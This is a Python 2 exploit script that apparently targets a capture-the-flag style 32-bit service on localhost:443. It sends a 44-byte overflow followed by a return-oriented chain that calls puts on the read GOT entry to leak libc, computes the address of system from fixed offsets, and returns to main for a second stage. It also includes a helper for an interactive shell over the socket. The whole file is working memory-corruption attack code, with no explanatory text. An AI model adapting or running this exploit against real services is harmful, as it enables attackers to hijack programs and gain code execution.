#!/usr/bin/python
# -*- coding:utf-8 -*-

import sys, socket, struct, telnetlib, time

def sock(remoteip, remoteport):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((remoteip, remoteport))
	return s

def recv_time(s):
	time.sleep(0.1)
	msg = s.recv(1024)
	return msg

def shell(s):
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def escape16(data):
	e = [0x03, 0x04, 0x0d, 0x11, 0x13, 0x15, 0x16, 0x17, 0x1a, 0x1c, 0x7f]
	d = ""
	for c in data:
		f = 1
		for i in e:
			if ord(c) == i:
				d += "\x16"
				d += c
				f = 0
				break
		if f:
			d += c

	return d

def print_hex(data):
	for c in data:
		sys.stdout.write(x(hex(ord(c))))

	print ""

def x(c):
	if len(c) == 3:
		c = c[:2] + "0" + c[2]

	return c.replace("0x", "\\x")

def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]

if __name__ == "__main__":
	ip = "localhost"
	port = 443

	s = sock(ip, port)

	msg = recv_time(s)
	print msg

	loc_main = 0x0804844d
	plt_read = 0x08048310
	got_read = 0x0804a00c
	plt_puts = 0x08048320
	pop1ret = 0x0804850f
	pop3ret = 0x0804850d
	got_libc_start_main = 0x0804a018

	libc_offset_read = 0xdaf60
	libc_offset_system = 0x40310

	d = ""
	d += "A" * 44

	d += p(plt_puts)
	d += p(pop1ret)
	d += p(got_read)
	d += p(loc_main)
	d += "\n"
	d = escape16(d)

#	sys.stdout.write("send : ")
#	print_hex(d)

	s.send(d)

	msg = recv_time(s)
	msg = msg.split("\x0d\x0a")[4]

	print hex((u(msg[:4])) - libc_offset_read + libc_offset_system)
#	print_hex(p(u(msg[:4])))
#	print hex(u(msg[:4]))
#	print_hex(msg[:4])

	d = ""
	d += "A" * 44
	d += p(loc_main)
	d += "\n"
	d = escape16(d)

	s.send(d)
	msg = recv_time(s)
	print msg

#	sys.stdout.write("recv : ")
#	print_hex(msg)

